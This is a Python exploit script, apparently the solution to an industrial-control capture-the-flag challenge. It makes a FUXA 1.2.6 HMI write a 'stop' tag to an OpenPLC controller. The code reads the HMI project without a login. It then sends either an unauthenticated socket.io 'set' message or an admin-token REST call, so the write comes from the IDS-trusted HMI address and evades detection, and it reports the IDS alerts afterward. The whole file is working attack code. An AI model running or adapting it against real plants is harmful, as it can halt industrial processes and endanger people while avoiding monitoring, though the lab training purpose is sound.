#!/usr/bin/env python3
"""
Trusted Writer: make the HMI (FUXA) write a PLC tag for you.

The IDS write rules skip FUXA (172.18.0.4) as a trusted Modbus writer. This
script never opens a Modbus connection of its own; it asks FUXA to write, and
FUXA sends the Modbus request to OpenPLC from its own address.

Two ways to ask, both FUXA 1.2.6:

  --route socket   (default) the socket.io message the HMI page sends when
                   someone clicks a button. FUXA accepts it from a guest, so
                   no login and no token are needed.
  --route rest     POST /api/setTagValue, which needs an administrator token:
                   pass --token (for example one from the Forged HMI Token
                   challenge) or --user/--password for a single login.

The stop tag's ID and its device are looked up in FUXA's project, which FUXA
serves without a login (see the HMI Project Recon challenge). Standard
library only, so it runs in the attack shell as is.

    python3 trusted_writer.py                    # stop the plant (stop = 1)
    python3 trusted_writer.py --value 0          # restore it
    python3 trusted_writer.py --route rest --token eyJ...
    python3 trusted_writer.py --ids-url http://172.18.0.1:8443   # show what the IDS saw
"""
import argparse
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request


def http(url, data=None, headers=None, timeout=10):
    req = urllib.request.Request(url, data=data, headers=headers or {},
                                 method="POST" if data is not None else "GET")
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.status, resp.read().decode("utf-8", "replace")


def find_tag(base, name):
    """(device id, tag id, wire address) of the tag called `name` in FUXA's project.

    FUXA numbers Modbus addresses from 1, the request on the wire from 0.
    """
    _, body = http(f"{base}/api/project")
    for device_id, device in json.loads(body).get("devices", {}).items():
        for tag in (device.get("tags") or {}).values():
            if tag.get("name") == name:
                return device_id, tag["id"], int(tag.get("address") or 0) - 1
    sys.exit(f"No tag called {name!r} in FUXA's project")


def read_tag(base, tag_id):
    ids = urllib.parse.quote(json.dumps([tag_id]))
    _, body = http(f"{base}/api/getTagValue?ids={ids}")
    values = json.loads(body)
    return values[0].get("value") if values else None


def write_socket(base, device_id, tag_id, value):
    """Send the HMI's own 'device-values' set message over socket.io polling.

    FUXA 1.2.6 bundles socket.io 2, i.e. Engine.IO protocol 3: open a session
    with a GET, then POST packets framed as '<length>:<packet>'. '4' is an
    Engine.IO message, '2' a socket.io EVENT.
    """
    url = f"{base}/socket.io/?EIO=3&transport=polling"
    _, opening = http(url)
    match = re.search(r'"sid":"([^"]+)"', opening)
    if not match:
        sys.exit(f"FUXA did not open a socket.io session: {opening[:120]!r}")
    packet = "42" + json.dumps(["device-values", {
        "cmd": "set", "var": {"source": device_id, "id": tag_id, "value": value}}])
    status, body = http(f"{url}&sid={match.group(1)}",
                        data=f"{len(packet)}:{packet}".encode(),
                        headers={"Content-Type": "text/plain;charset=UTF-8"})
    print(f"socket.io POST: HTTP {status} {body!r}")


def write_rest(base, tag_id, value, token):
    payload = json.dumps({"tags": [{"id": tag_id, "value": value}]}).encode()
    try:
        status, body = http(f"{base}/api/setTagValue", data=payload,
                            headers={"Content-Type": "application/json",
                                     "x-access-token": token})
    except urllib.error.HTTPError as e:
        sys.exit(f"setTagValue refused: HTTP {e.code} {e.read().decode()[:200]} "
                 "(it needs an administrator token)")
    print(f"setTagValue: HTTP {status} {body[:120]!r}")


def login(base, user, password):
    payload = json.dumps({"username": user, "password": password}).encode()
    try:
        _, body = http(f"{base}/api/signin", data=payload,
                       headers={"Content-Type": "application/json"})
    except urllib.error.HTTPError as e:
        sys.exit(f"Login refused: HTTP {e.code}")
    return json.loads(body)["data"]["token"]


def show_ids(ids_url, wire, since):
    _, body = http(f"{ids_url}/api/modbus/writes")
    writes = [w for w in json.loads(body).get("writes", [])
              if w.get("address", -1) <= wire < w.get("address", -1) + w.get("count", 0)]
    print(f"\n== IDS write journal: writes of wire address {wire} (newest last)")
    for w in writes[-5:]:
        print(f"  {w['timestamp']}  {w['src']:<14} ({w.get('service') or 'unknown'})  "
              f"fc={w['function']}  values={w['values']}")
    _, body = http(f"{ids_url}/api/alerts")
    alerts = [a for a in json.loads(body).get("alerts", [])
              if a.get("timestamp", "") >= since and a.get("rule") != "arp_spoof"]
    print(f"== IDS alerts since this script started: {len(alerts)}")
    for a in alerts[-5:]:
        print(f"  {a['timestamp']}  {a['rule']}  {a['src']}")


def main():
    ap = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    ap.add_argument("--fuxa", default="http://172.18.0.4:1881", help="FUXA base URL")
    ap.add_argument("--tag", default="stop", help="tag name in the FUXA project")
    ap.add_argument("--value", type=int, default=1, help="value to write (1 = stop)")
    ap.add_argument("--route", choices=("socket", "rest"), default="socket")
    ap.add_argument("--token", help="admin token for --route rest")
    ap.add_argument("--user", help="log in once for --route rest")
    ap.add_argument("--password")
    ap.add_argument("--ids-url", help="IDS base URL, to print what it saw afterwards")
    args = ap.parse_args()

    base = args.fuxa.rstrip("/")
    ids_url = args.ids_url.rstrip("/") if args.ids_url else None
    # The IDS's own clock, so its timestamps compare without time zone trouble.
    started = json.loads(http(f"{ids_url}/api/status")[1])["now"] if ids_url else None
    device_id, tag_id, wire = find_tag(base, args.tag)
    print(f"tag {args.tag!r}: id {tag_id} on device {device_id}, wire address {wire}")
    print(f"before: {read_tag(base, tag_id)}")

    if args.route == "socket":
        write_socket(base, device_id, tag_id, args.value)
    else:
        token = args.token or (login(base, args.user, args.password)
                               if args.user else None)
        if not token:
            sys.exit("--route rest needs --token or --user/--password")
        write_rest(base, tag_id, args.value, token)

    time.sleep(3)   # FUXA polls the PLC about once a second
    print(f"after:  {read_tag(base, tag_id)}")
    if ids_url:
        show_ids(ids_url, wire, started)


if __name__ == "__main__":
    main()
